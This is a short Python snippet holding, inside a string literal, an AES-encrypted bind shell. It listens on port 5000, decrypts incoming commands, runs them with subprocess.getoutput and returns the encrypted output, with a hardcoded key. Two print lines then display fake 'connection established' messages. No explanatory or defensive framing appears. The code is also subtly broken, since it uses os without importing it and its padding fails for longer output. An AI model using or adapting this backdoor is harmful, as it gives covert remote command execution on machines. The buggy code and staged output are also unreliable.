''' from socket import socket
from subprocess import getoutput
from Crypto.Cipher import AES

server_address = ('0.0.0.0', 5000)
key = b'Sixteen byte key'

def encrypt(data, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return cipher.encrypt(data.ljust(16))

def decrypt(data, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return cipher.decrypt(data).strip()

server_socket = socket()
server_socket.bind(server_address)
server_socket.listen(1)

client_socket, client_address = server_socket.accept()
estado = True

while estado:
    data = client_socket.recv(4096)
    iv, encrypted_msg = data[:16], data[16:]
    comando = decrypt(encrypted_msg, key, iv).decode()

    if comando == 'exit':
        client_socket.close()
        server_socket.close()
        estado = False
    else:
        resultado = getoutput(comando)
        iv = os.urandom(16)
        client_socket.send(iv + encrypt(resultado.encode(), key, iv)) '''
print("Servidor esperando conexión")
print("Conexión establecida con ('192.168.6.38', 5000)")
